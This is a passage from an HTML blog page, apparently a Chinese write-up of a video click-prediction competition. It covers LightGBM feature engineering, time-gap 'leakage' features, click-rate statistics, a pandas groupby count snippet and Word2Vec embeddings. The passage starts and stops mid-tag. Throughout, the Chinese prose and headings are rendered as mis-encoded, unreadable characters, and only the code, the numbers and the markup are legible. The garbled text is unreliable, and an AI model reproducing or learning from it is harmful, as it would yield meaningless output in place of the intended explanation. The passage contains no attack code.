align="center">Êò®Êó•ËÄÅÁî®Êà∑ÊØî‰æã</th></tr></thead><tbody><tr><td align="center">9</td><td align="center">0.6501773380623483</td></tr><tr><td align="center">10</td><td align="center">0.6388528497721992</td></tr><tr><td align="center">11</td><td align="center">0.7410879161463921</td></tr></tbody></table><h2 id="ÁâπÂæÅÂ∑•Á®ã"><a href="#ÁâπÂæÅÂ∑•Á®ã" class="headerlink" title="ÁâπÂæÅÂ∑•Á®ã"></a>ÁâπÂæÅÂ∑•Á®ã</h2><p>Ëøô‰∏ÄÈ¢òÊï∞ÊçÆÈáèÊØîËæÉÂ§ßÔºåÊ®°ÂûãËÆ≠ÁªÉËµ∑Êù•‰πüÊØîËæÉÊÖ¢ÔºåÊâÄ‰ª•ÈíàÂØπ lgb Ê®°ÂûãÂáÜÂ§á‰∫Ü‰∏§Â•óÂèÇÊï∞Ôºå‰∏ÄÂ•óÂ≠¶‰π†ÁéáÊØîËæÉÂ§ßÁî®‰∫éÂø´ÈÄüËø≠‰ª£È™åËØÅÁâπÂæÅÊïàÊûúÔºåËÆ≠ÁªÉ‰∏ÄÊ¨°Â§ßÊ¶ÇÂú®ÂçäÂ∞èÊó∂Â∑¶Âè≥ÔºåÁ∫ø‰∏äÂàÜÊï∞0.825„ÄÇÂè¶Â§ñ‰∏ÄÂ•óÂ≠¶‰π†Áéá‰∏∫0.01ÁöÑÂèÇÊï∞Áî®‰∫éÊ≠£ÂºèÊèê‰∫§ÔºåËøêË°å‰∏ÄÊ¨°Â§ßÊ¶ÇÈúÄË¶Å15Â∞èÊó∂ÔºåÁ∫ø‰∏äÂàÜÊï∞0.8377„ÄÇ</p><h3 id="Á©øË∂äÁâπÂæÅ"><a href="#Á©øË∂äÁâπÂæÅ" class="headerlink" title="Á©øË∂äÁâπÂæÅ"></a>Á©øË∂äÁâπÂæÅ</h3><p>ÂâçÈù¢ËØ¥ËøáÔºåËøôÈ¢òÂ∏∏ËßÑÁâπÂæÅÊî∂ÁõäÂæàÂ∞èÔºå‰ΩÜÁî±‰∫éÊï∞ÊçÆÁªôÂá∫‰∫ÜËßÜÈ¢ëÊõùÂÖâÊó∂Èó¥ÔºàtsÔºâÔºåÊâÄ‰ª•ÂèØ‰ª•ÂÄüÂä©ÂÖ∂ÊûÑÈÄ†Â§ßÈáèÁ©øË∂äÁâπÂæÅÔºåÊàñËÄÖÁß∞‰Ωú‰∏∫ËßÜÈ¢ëÁÇπÂáªÂêéÁöÑÊ®°ÂºèÁâπÂæÅ„ÄÇÂü∫Êú¨ÊûÑÈÄ†ÊñπÊ≥ïÂ∞±ÊòØËÆ°ÁÆóË∑ùÁ¶ª‰∏ã‰∏ÄÊ¨°ËßÜÈ¢ëÊõùÂÖâÁöÑÊó∂Èó¥Â∑Æ„ÄÇËøô‰πàÂÅöÁöÑÂéüÂõ†‰πüÂæàÂ•ΩÁêÜËß£ÔºåÂÅáÂ¶Ç‰∏Ä‰∏™‰∫∫ÁÇπÂáª‰∫ÜÊüê‰∏™ËßÜÈ¢ëÔºåÈÇ£‰πàÂøÖÁÑ∂‰ºöËßÇÁúã‰∏ÄÊÆµÊó∂Èó¥ÔºåÈÇ£‰πàË∑ùÁ¶ª‰∏ã‰∏ÄÊ¨°ËßÜÈ¢ëÁöÑÊõùÂÖâÂ∞±‰ºö‰πÖ‰∏ÄÁÇπÔºåts Â∑ÆÂÄº‰πüËæÉÂ§ß„ÄÇÁõ∏ÂèçÔºåËøûÁª≠‰∏§Ê¨°ËßÜÈ¢ëÁöÑÊõùÂÖâÊó∂Èó¥Èó¥ÈöîÂ∫îËØ•ÂæàÂ∞è„ÄÇË∑ùÁ¶ª‰∏äÊ¨°ËßÜÈ¢ëÁöÑÊõùÂÖâÊó∂Èó¥Â∑Æ‰πüÊòØÊúâÊïàÁöÑÔºåÊ†πÊçÆ APP ÁöÑÊé®ËçêËßÑÂàôÔºåÂú®ÁÇπÂáªËßÜÈ¢ëÂêé‰∏ãÊ¨°Êé®ËçêÁöÑ‰πüÊòØÁõ∏ÂÖ≥ËßÜÈ¢ëÔºå‰ªéËÄåÂÜçÊ¨°ÁÇπÂáªÁöÑÂèØËÉΩÊÄßËæÉÂ§ß„ÄÇÊàë‰ª¨ÊûÑÈÄ†‰∫ÜÂ§ßÈáèÁªÑÂêà‰∏ãÁöÑËßÜÈ¢ëÊõùÂÖâÊó∂Èó¥Èó¥ÈöîÔºåÊõùÂÖâË∑®Â∫¶‰πü‰ªé1ÂæÄÂêéÊâ©Â±ïÔºå‰∏ªË¶ÅÊûÑÈÄ†Â¶Ç‰∏ãÁâπÂæÅÔºö</p><ul><li>deviceid ÂâçxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid netmodel ÂâçxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid ÂêéxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid pos ÂêéxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid netmodel ÂêéxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid netmodel pos ÂêéxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid lng_lat ÂêéxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li><li>deviceid lng_lat pos ÂêéxÊ¨°ÊõùÂÖâÂà∞ÂΩìÂâçÁöÑÊó∂Èó¥Â∑Æ</li></ul><p>Èô§ ts ÊòØ‰∏™Âº∫ÁâπÂæÅ‰πãÂ§ñÔºåpos ‰πüÊòØÂº∫Áâπ„ÄÇpos ÂèñÂÄºËåÉÂõ¥‰∏∫0 ÔΩû 8ÔºåÂèñÂÄºÂàÜÂ∏ÉÂ¶ÇÂõæ2Â∑¶ÊâÄÁ§∫„ÄÇÊäìÂåÖÂàÜÊûêÂèØÁü•0 ÔΩû 3ËøôÂõõ‰∏™ÂÄºÂØπÂ∫îÈ¶ñÈ°µÊé®ËçêÂõõ‰∏™‰ΩçÁΩÆÔºå‰ΩÜ‰ªéÂõæ2Âè≥ÂèØ‰ª•ÁúãÂà∞ÁïåÈù¢Â§ßÂ∞èÊúÄÂ§öÂè™Â§üÊòæÁ§∫2‰∏™ÂçäÔºåÊúâÊõùÂÖâÊâçÊúâÊµÅÈáèÔºåÊâÄ‰ª•Êâç‰ºöÂØºËá¥ pos Âèñ0Ôºå1Ôºå2ÁöÑÊï∞ÊçÆÈáèÁõ∏ËæÉ‰∫é3ËæÉÂ§ß„ÄÇpos‰∏≠ÁöÑÂÖ∂‰ªñÂèñÂÄºÂπ∂Ê≤°ÊúâÊâæÂà∞Âú®‰ΩïÂ§Ñ‰∫ßÁîüÔºåÁåúÊÉ≥ÂèØËÉΩÊù•Ëá™‰∫éÁõ∏ÂÖ≥Êé®ËçêËßÜÈ¢ëÁÇπÂáªÊàñËÄÖÊ∂àÊÅØÊ†èÊé®ÈÄÅÁÇπÂáª„ÄÇËøõ‰∏ÄÊ≠•ÂàÜÊûêÂú®‰∏çÂêå pos ‰∏ãÁöÑÁÇπÂáªÁéáÔºåÂ¶ÇÂõæ3ÊâÄÁ§∫„ÄÇÂèØ‰ª•ÁúãÂá∫ÂêåÊ†∑ÊòØÈ¶ñÈ°µÊé®Ëçê‰ΩçÁΩÆÔºå‰ΩçÁΩÆ3ËôΩÁÑ∂ÊÄªÊï∞ÊçÆ‰∏çÂ§öÔºå‰ΩÜÁÇπÂáªÁéáËøúÈ´ò‰∫éÂÖ∂‰ªñÈ¶ñÈ°µ‰ΩçÁΩÆ„ÄÇÂàùÊ≠•ÁåúÊÉ≥Â§ßÈÉ®ÂàÜÁî®Êà∑ÂèØËÉΩÂè™ÊâìÂºÄÁúã‰∫Ü‰∏Ä‰∏ãÔºåÂè™ÁúãÂà∞È¶ñÈ°µÂ±èÂπïÂ§ßÂ∞èÂ±ïÁ§∫ÁöÑ‰∏â‰∏™ËßÜÈ¢ëÔºåÂπ∂‰∏ç‰ºö‰∏ãÊªëÊü•ÁúãÊõ¥Â§öÊé®ËçêÔºåÊâÄ‰ª•Êâç‰ºöÂá∫Áé∞0 ÔΩû 2ÁöÑÊï∞ÊçÆÈáèÂ§ßÔºå‰ΩÜÁÇπÂáªÁéáÈùûÂ∏∏‰ΩéÁöÑÊÉÖÂÜµ„ÄÇÂØπ‰∫éÊ∑±Â∫¶‰ΩøÁî®Áî®Êà∑ÔºåÂÖ∂Ë¶Å‰πàÂá∫‰∫éÂÆåÊàê‰ªªÂä°ÊãøÂ•ñÂä±ÁöÑÁõÆÁöÑËøòÊòØÊ≠£Â∏∏‰ΩøÁî®ÔºåÁÇπÂáªÊ¨≤ÊúõÁõ∏ÂØπÊõ¥È´òÔºåËøôÈÉ®ÂàÜÁî®Êà∑Âú®‰ΩøÁî®Êé¢Á¥¢‰∏≠‰ºöÊõ¥Â§öÂú∞ÁúãÂà∞ pos 3‰ª•‰∏äÁöÑËßÜÈ¢ë„ÄÇ</p><center class="half">    <img src="http://pic.logicjake.xyz/pos%E5%88%86%E5%B8%83.png" style="margin: auto;max-width: 30%; margin-right:10%;"/><img src="http://pic.logicjake.xyz/%E8%A7%86%E9%A2%91%E4%BD%8D%E7%BD%AE.jpg" style="margin: auto;max-width: 30%;"/>    <div style="margin: 2%">Âõæ2 Â∑¶Ôºöpos ÂèñÂÄºÂàÜÂ∏ÉÔºõÂè≥Ôºöapp ËßÜÈ¢ëÂ±ïÁ§∫‰Ωç</div></center><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/pos%20%E7%82%B9%E5%87%BB%E7%8E%87.png" alt="Âõæ3 ÂêÑposÊòØÂê¶ÁÇπÂáªÂàÜÂ∏É" title="">                </div>                <div class="image-caption">Âõæ3 ÂêÑposÊòØÂê¶ÁÇπÂáªÂàÜÂ∏É</div>            </figure></div><p>Êïà‰ªø ts ÁöÑÁ©øË∂äÁâπÂæÅÊûÑÈÄ†ÔºåÊàë‰ª¨ÂèàÂ∞ùËØïÊûÑÈÄ†‰∫ÜÂêéxÊ¨°ËßÜÈ¢ëÊõùÂÖâ‰ΩçÁΩÆÔºåÂêåÊ†∑ÊïàÊûú‰πüÂçÅÂàÜÊòæËëó„ÄÇ‰ªîÁªÜÁ†îÁ©∂ APP ÂèëÁé∞ÔºåÂÅáÂ¶Ç‰Ω†‰∏çÊòØÁõ¥Êé•Âú®È¶ñÈ°µÁÇπÂáªÊí≠ÊîæËßÜÈ¢ëÔºåËÄåÊòØÁÇπÂáªËøõÂÖ•ËØ•ËßÜÈ¢ëÁöÑËØ¶ÊÉÖÈ°µÔºåÂêåÊ†∑‰ºöËß¶ÂèëËßÜÈ¢ëËßÇÁúãÔºåÂêåÊó∂Âú®ËßÜÈ¢ëËØ¶ÊÉÖÈ°µ‰∏ã‰ºöÂá∫Áé∞Áõ∏ÂÖ≥Êé®ËçêËßÜÈ¢ëÔºåÂ¶ÇÂõæ4Á∫¢Ê°ÜÊâÄÁ§∫„ÄÇÁªº‰∏äÁåúÊµãÔºåpos ‰∏≠Êüê‰∫õÂèñÂÄºÂØπÂ∫î‰∫éÁõ∏ÂÖ≥Êé®Ëçê‰ΩçÔºåÊâÄ‰ª•ÂΩì‰∏ãÊ¨°ËßÜÈ¢ëÊõùÂÖâ‰ΩçÁΩÆ‰∏∫‰∏äËø∞Áõ∏ÂÖ≥Êé®Ëçê‰ΩçÔºåÂàôË°®Á§∫ÂΩìÊ¨°ËßÜÈ¢ë‰∏ÄÂÆöÊòØË¢´Áî®Êà∑ÁÇπÂáªËßÇÁúãÁöÑ„ÄÇ</p><div style="margin: auto;max-width: 30%; "><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E7%9B%B8%E5%85%B3%E6%8E%A8%E8%8D%90.jpg" alt="Âõæ4 Áõ∏ÂÖ≥Êé®Ëçê" title="">                </div>                <div class="image-caption">Âõæ4 Áõ∏ÂÖ≥Êé®Ëçê</div>            </figure></div><p>ÈÄöËøáÂ≠¶‰π†‰∏äËø∞‰∏§Â§ßÁ±ªÁ©øË∂äÁâπÂæÅÔºåÊ®°ÂûãÁöÑÊïàÊûúÂ∑≤ÁÑ∂ÂçÅÂàÜÊòéÊòæÔºåÂú®Âø´ÈÄüËø≠‰ª£Ê®°Âûã‰∏äÔºåÂ∑≤ÁªèËÉΩÂ§üËææÂà∞0.80114ÁöÑÂàÜÊï∞„ÄÇÁõ∏ËæÉ‰∫éÊúÄÈ´òÂàÜ0.825ÔºåËØ¥ÊòéÂ∏∏ËßÑÁâπÂæÅÂ∏¶Êù•ÁöÑÊî∂ÁõäÂè™ËÉΩÊèêÈ´ò0.024„ÄÇÁ©øË∂äÁâπÂæÅÂè™Êúâ30+Ôºå‰ΩÜÂ∏∏ËßÑÁâπÂæÅÂç¥Êúâ140Â∑¶Âè≥ÔºåÊî∂ÁõäÂØπÊØî‰∏ÄÁõÆ‰∫ÜÁÑ∂„ÄÇÂ∑•Á®ãÂÆûË∑µ‰∏≠Á©øË∂äÁâπÂæÅËá™ÁÑ∂Êó†Ê≥ï‰ΩøÁî®Ôºå‰ΩÜ‰Ωú‰∏∫‰∏ÄÈ°πÊï∞ÊçÆÊåñÊéòÊØîËµõÔºåÂΩìÁÑ∂ÊòØËøΩÊ±ÇÂ∑≤ÊúâÊï∞ÊçÆÁöÑÊúÄÂ§ßÂåñÂà©Áî®„ÄÇ</p><p>Èô§‰∫Ü‰∏äËø∞‰∏§Â§ßÁ±ªÁ©øË∂äÁâπÂæÅÔºåËøòÊûÑÈÄ†‰∫Ü‰∏ã‰∏ÄÊ¨°ËßÜÈ¢ëÊõùÂÖâÁöÑÁΩëÁªúÁéØÂ¢ÉÂíåÂü∫‰∫éÁªèÁ∫¨Â∫¶ÁöÑ‰ΩçÁΩÆÂèòÂåñ„ÄÇ</p><h3 id="ÂéÜÂè≤ÁâπÂæÅ"><a href="#ÂéÜÂè≤ÁâπÂæÅ" class="headerlink" title="ÂéÜÂè≤ÁâπÂæÅ"></a>ÂéÜÂè≤ÁâπÂæÅ</h3><p>ÂéÜÂè≤ÁâπÂæÅ‰∏ªË¶ÅÁî®ËøáÂéª‰∏Ä‰∏™Êó∂Èó¥Âçï‰ΩçÁöÑÊï∞ÊçÆËøõË°åÁªüËÆ°ÔºåÁÑ∂Âêé‰Ωú‰∏∫ÂΩìÂâçÊó∂ÂàªÁöÑÁâπÂæÅ„ÄÇÁî±‰∫éÊï∞ÊçÆ‰∏≠Êò®Êó•ËÄÅÁî®Êà∑Âç†ÊØîËæÉÂ§öÔºåÊâÄ‰ª•Êú¨ÊñπÊ°àÂ§ßÈáèÊûÑÈÄ†‰∫ÜÊò®Êó•Êï∞ÊçÆÁªüËÆ°ÁâπÂæÅ„ÄÇÂú®ËøôÈÉ®ÂàÜÁâπÂæÅ‰∏≠Â§ßÈáèÊ∂âÂèäÂà∞ÂêÑÁßçÁÇπÂáªÁéáÁöÑÊûÑÈÄ†ÔºåÁÇπÂáªÁéá‰ΩøÁî®Âà∞‰∫ÜÊ†áÁ≠æÊï∞ÊçÆÔºåÂõ†Ê≠§Áõ∏ËæÉ‰∫éÂÖ®Â±ÄÁªüËÆ°ÁÇπÂáªÁéáÔºåÊûÑÈÄ†Êò®Êó•ÁÇπÂáªÁéáÈÅøÂÖç‰∫ÜÊ†áÁ≠æÊ≥ÑÈú≤ÂíåÊï∞ÊçÆÁ©øË∂äÈóÆÈ¢ò„ÄÇ‰∏ªË¶ÅÊûÑÈÄ†ÁöÑÁÇπÂáªÁªüËÆ°ÁâπÂæÅÂ¶Ç‰∏ãÔºö</p><ul><li>deviceid ÁÇπÂáªÊ¨°Êï∞ÔºåÁÇπÂáªÁéá</li><li>deviceid, hour ÁÇπÂáªÁéá</li><li>deviceid, netmodel ÁÇπÂáªÁéá</li><li>newsid ÁÇπÂáªÊ¨°Êï∞ÔºåÁÇπÂáªÁéá</li><li>next_pos ÁÇπÂáªÁéá</li></ul><p>ÂéüÊï∞ÊçÆÁªôÂá∫‰∫Ü‰∏§‰∏™Êó∂Èó¥ÁâπÂæÅÔºå‰∏Ä‰∏™ÊòØËßÜÈ¢ëÊõùÂÖâÊó∂Èó¥ ts ÂíåËßÜÈ¢ëÂÅáÂ¶ÇË¢´ÁÇπÂáªÊó∂ÁöÑÁÇπÂáªÊó∂Èó¥ timestamp„ÄÇ‰∫åËÄÖÁöÑÂ∑ÆÂÄºÂèØ‰ª•Ë°®Á§∫Áî®Êà∑ÁöÑÂèçÂ∫îÊó∂Èó¥ÔºåÂèçÂ∫îÊó∂Èó¥Ë∂äÁü≠ËØ¥ÊòéÁî®Êà∑Ë∂äÂñúÊ¨¢ËØ•Á±ªËßÜÈ¢ë„ÄÇÈíàÂØπÂèçÂ∫îÊó∂Èó¥ÂàÜÂà´‰ª• deviceid Âíå newsid ‰∏∫Âçï‰ΩçÊûÑÈÄ†ÁªüËÆ°ÁâπÂæÅÔºåÊûÑÈÄ†ÊñπÂºèÂåÖÊã¨ÔºömaxÔºåminÔºåmeanÔºåstdÔºåmedianÔºåkurt Âíå quantile„ÄÇÂèçÂ∫îÊó∂Èó¥‰ªéÁî®Êà∑‰æßÊèêÂèñÔºåÊâÄ‰ª•ÈíàÂØπ newsid ÂÅöÁªüËÆ°ËØØÂ∑ÆËæÉÂ§ßÔºåÊïàÊûú‰∏çÊòéÊòæÔºåÊâÄ‰ª•Âè™‰øùÁïô‰∫Ü std ÁªüËÆ°„ÄÇ</p><p>Èô§‰∫Ü‰ª•Â§©‰∏∫Âçï‰ΩçÊûÑÈÄ†Êò®Êó•Êï∞ÊçÆÁâπÂæÅÔºåËøò‰ª•Â∞èÊó∂‰∏∫Âçï‰ΩçÊûÑÈÄ†‰∏ä‰∏ÄÂ∞èÊó∂ÁöÑÁªüËÆ°ÁâπÂæÅÔºåÂ∞ùËØï‰∏ãÊù•Âè™Êúâ‰∏ä‰∏ÄÂ∞èÊó∂ÁöÑ deviceid ÁÇπÂáªÊ¨°Êï∞ÂíåÁÇπÂáªÁéáÊúâÁÇπÊïàÊûú„ÄÇ</p><h3 id="count-ÁªüËÆ°"><a href="#count-ÁªüËÆ°" class="headerlink" title="count ÁªüËÆ°"></a>count ÁªüËÆ°</h3><p>ËøôÈÉ®ÂàÜÁâπÂæÅ‰ª•‰∏çÂêåÊó∂Èó¥Âçï‰ΩçËøõË°å count ÁªüËÆ°ÔºåÊó∂Èó¥Âçï‰ΩçÂåÖÊã¨Ôºö10ÂàÜÈíüÔºåÂ∞èÊó∂ÔºåÂ§©ÔºåÂÖ®Â±Ä„ÄÇ‰∏çÂêå‰∫éÂéÜÂè≤ÁâπÂæÅÔºåËøôÈÉ®ÂàÜ count ÁªüËÆ°ÂæÄÂæÄ‰ºöÂá∫Áé∞Êï∞ÊçÆÁ©øË∂äÈóÆÈ¢ò„ÄÇcount ÁâπÂæÅ‰∏ªË¶ÅÂèçÂ∫îÂÅèÂ•ΩÂ±ûÊÄßÔºåÊØîÂ¶Ç‰ªäÂ§©Âì™‰∏™ËßÜÈ¢ëÊõùÂÖâÈáèÂ§ßÔºåÁî®Êà∑ÂÄæÂêë‰∫éÂú®Âì™‰∏™Êó∂Èó¥ÔºåÂì™‰∏™ÁΩëÁªúÁéØÂ¢É‰∏ã‰ΩøÁî® APP„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat_list = [[<span class="string">'deviceid'</span>], [<span class="string">'guid'</span>], [<span class="string">'newsid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'pos'</span>], [<span class="string">'newsid'</span>, <span class="string">'pos'</span>], </span><br><span class="line">            [<span class="string">'deviceid'</span>, <span class="string">'guid'</span>, <span class="string">'newsid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'next_pos'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_day_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'day'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>], [<span class="string">'guid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'pos'</span>], [<span class="string">'deviceid'</span>, <span class="string">'netmodel'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_minute10_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'day'</span>, <span class="string">'hour'</span>, <span class="string">'minute10'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>, <span class="string">'netmodel'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_hour_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'hourl'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>, <span class="string">'group'</span>, <span class="string">'pos'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby(f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br></pre></td></tr></table></figure><h3 id="embedding-ÁâπÂæÅ"><a href="#embedding-ÁâπÂæÅ" class="headerlink" title="embedding ÁâπÂæÅ"></a>embedding ÁâπÂæÅ</h3><p>‰Ωú‰∏∫Êé®Ëçê‰∏≠ÈáçË¶ÅÁöÑ‰∏ÄÊñπÔºåÊï∞ÊçÆÈõÜÁªôÂá∫ÁöÑËßÜÈ¢ë‰ø°ÊÅØÂçÅÂàÜÂ∞ëÔºåÂè™Êúâ‰∏ÄÂàóÁÆÄÂçïÁöÑËßÜÈ¢ë idÔºåÂπ∂Ê≤°ÊúâËßÜÈ¢ëÂàÜÁ±ª‰πãÁ±ªÁöÑÂØπÊé®ËçêÈáçË¶ÅÁöÑÂ±ûÊÄß‰ø°ÊÅØÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ËÉΩ‰ªéËßÜÈ¢ëË¢´Êé®ËçêÁªôÂì™‰∫õÁî®Êà∑‰∏ãÊâã„ÄÇ‰ª•ËßÜÈ¢ë‰∏∫Âçï‰ΩçÔºåÊâæÂá∫Ë¢´Êé®ËçêÁöÑÁî®Êà∑ÂàóË°®ÔºåÊØè‰∏™ÂàóË°®‰Ωú‰∏∫Âè•Â≠êÂñÇÂà∞ Word2Vec Ê®°ÂûãÂæóÂà∞ÊØè‰∏™Áî®Êà∑ÁöÑ embedding ÂêëÈáèÔºåÁî®ËßÜÈ¢ëÊâÄÊúâË¢´Êé®ËçêÁöÑÁî®Êà∑ÁöÑ embedding ÂêëÈáèÂπ≥ÂùáÂÄºË°®Á§∫ËßÜÈ¢ë„ÄÇÂæóÂà∞ embedding ‰πãÂêéÔºåÂ∞±ÂèØ‰ª•Â∫¶Èáè‰∏§‰∏™ËßÜÈ¢ë‰πãÈó¥ÁöÑÁõ∏‰ººÂ∫¶ÔºåÊâÄ‰ª•‰πüÂ∞±‰∫ßÁîü‰∫ÜÂè¶Â§ñ‰∏ÄÁßçÊÄùË∑ØÔºåÂΩì‰∏Ä‰∏™Êñ∞ËßÜÈ¢ëË¢´Êé®ËçêÁªôÁî®Êà∑ÂêéÔºåËÆ°ÁÆóÊñ∞ËßÜÈ¢ë‰∏é‰πãÂâçÁî®Êà∑Ë¢´Êé®ËçêËøáÔºàÊàñËÄÖÁúãËøáÔºâÁöÑËßÜÈ¢ëÁöÑÂπ≥ÂùáÁõ∏‰ººÂ∫¶ÔºåÂπ≥ÂùáÁõ∏‰ººÂ∫¶Ë∂äÂ§ßÔºåÁî®Êà∑ÁÇπÂáªÁöÑÂèØËÉΩÊÄßË∂äÂ§ß„ÄÇ‰ΩÜÂú®ÂÆûÈôÖËØïÈ™å‰∏≠ÊïàÊûú‰∏çÂ•ΩÔºå‰πü‰∏çÁü•ÈÅìÊòØ‰∏çÊòØ embedding ÊïàÊûúËææ‰∏çÂà∞ÁöÑÂéüÂõ†„ÄÇ</p><h3 id="user-Ë°®ÁöÑÊâìÂºÄÊñπÂºè"><a href="#user-Ë°®ÁöÑÊâìÂºÄÊñπÂºè" class="headerlink" title="user Ë°®ÁöÑÊâìÂºÄÊñπÂºè"></a>user Ë°®ÁöÑÊâìÂºÄÊñπÂºè</h3><p>Ëøô‰∏ÄÈ¢òÁâπÂæÅÊûÑÈÄ†‰∏ªË¶ÅËøòÊòØÂõ¥Áªï train Ë°®ÂÅöÁöÑÔºåuser Ë°®ÊâìÂºÄËøáÂ§öÊ¨°ÈÉΩÊ≤°Âï•ÊïàÊûú„ÄÇÁî®Êà∑ÁîªÂÉèÂ±ûÊÄß tag Âíå outertag Áª¥Â∫¶ÁâπÂà´È´òÔºåÂ∞ùËØïËøá PCA ÈôçÁª¥ÂíåÂêÑÁßç embedding ÊñπÂºèÈÉΩ‰∏çË°åÔºåÊúÄÂêéËøòÊòØÈááÁî®ÁöÑÂºÄÊ∫êÊñπÊ≥ïÔºåÂØπ tag ÁöÑÂàÜÊï∞ÂÅö‰∏Ä‰∫õÁÆÄÂçïÁöÑÁªüËÆ°„ÄÇapp Ë°®ÁöÑ applist Áª¥Â∫¶Êõ¥È´òÔºå‰πüÊòØÂêÑÁßçÂ∞ùËØïÊó†Êïà„ÄÇ</p><h3 id="ÂÖ∂‰ªñÁâπÂæÅ"><a href="#ÂÖ∂‰ªñÁâπÂæÅ" class="headerlink" title="ÂÖ∂‰ªñÁâπÂæÅ"></a>ÂÖ∂‰ªñÁâπÂæÅ</h3><p>Êàë‰ª¨Ê†πÊçÆËøûÁª≠‰ΩøÁî®Â∞ÜÁî®Êà∑ÁöÑ‰ΩøÁî®Êó∂Èó¥ÂàÜÊÆµÔºåÊõùÂÖâÊó∂Èó¥Èó¥ÈöîÂ∞ë‰∫é3ÂàÜÈíüÁöÑËßÜ‰∏∫Âêå‰∏Ä‰∏™‰ΩøÁî®Êó∂ÊÆµ„ÄÇÁÑ∂ÂêéÁªüËÆ°ÊØè‰∏™‰ΩøÁî®Êó∂ÊÆµ‰∏≠‰∏ä‰∏ÄÊ¨°ÊõùÂÖâÊó∂Èó¥Â∑ÆÁöÑ mean Âíå std ÁâπÂæÅ„ÄÇËøòÁªüËÆ°‰∫ÜÊØè‰∏™Áî®Êà∑‰∏ã‰∏ÄÊ¨°ÊõùÂÖâÊó∂Èó¥Â∑ÆÁöÑ meanÔºåstdÔºåmedianÔºåskew„ÄÇÈíàÂØπÊõùÂÖâÊó∂Èó¥Â∑ÆÁöÑÁªüËÆ°ÂèØ‰ª•ÂèçÂ∫îÁî®Êà∑ÂΩìÂâç‰ΩøÁî®Êó∂ÊÆµÊàñËÄÖÊï¥‰Ωì‰∏äÁöÑËßÜÈ¢ëËßÇÁúãÊó∂Èïø‰ø°ÊÅØ„ÄÇ</p><p>Ê≠§Â§ñËøòÊûÑÈÄ†‰∫ÜÁî®Êà∑Âπ≥ÂùáÊØèÂ∞èÊó∂Ë¢´ÊõùÂÖâÂ§öÂ∞ëËßÜÈ¢ëÔºåËØ•ËßÜÈ¢ëÊòØ‰∏ÄÂ∞èÊó∂ÂÜÖË¢´ÊõùÂÖâÁªôÁî®Êà∑ÁöÑÁ¨¨Âá†‰∏™ËßÜÈ¢ëÔºå‰ªäÊó•ÊõùÂÖâÁªôÁî®Êà∑ÁöÑËßÜÈ¢ëÈáè‰∏éÊò®Êó•ÊõùÂÖâÁªôÁî®Êà∑ÁöÑËßÜÈ¢ëÈáèÁöÑÂ∑ÆÂÄºÔºåÊú™Êù•‰∏ÄÂ∞èÊó∂Áî®Êà∑Âú®ËØ•ÁΩëÁªúÁéØÂ¢É‰∏ãÁöÑËßÜÈ¢ëÊõùÂÖâÊï∞Èáè„ÄÇ</p><p>ÂΩìÁÑ∂‰πüÊúâËÆ∏Â§öÂ∞ùËØïÂêéÊïàÊûú‰∏çÂ•ΩÁöÑÊìç‰ΩúÔºåÊØîÂ¶ÇÊï∞ÊçÆÈõÜÁªôÂá∫‰∫ÜÁî®Êà∑ÁöÑËÆæÂ§á‰ø°ÊÅØÔºöËÆæÂ§áÂéÇÂïÜÔºåËÆæÂ§áÁâàÊú¨ÔºåÂèØ‰ª•Êïà‰ªø<a 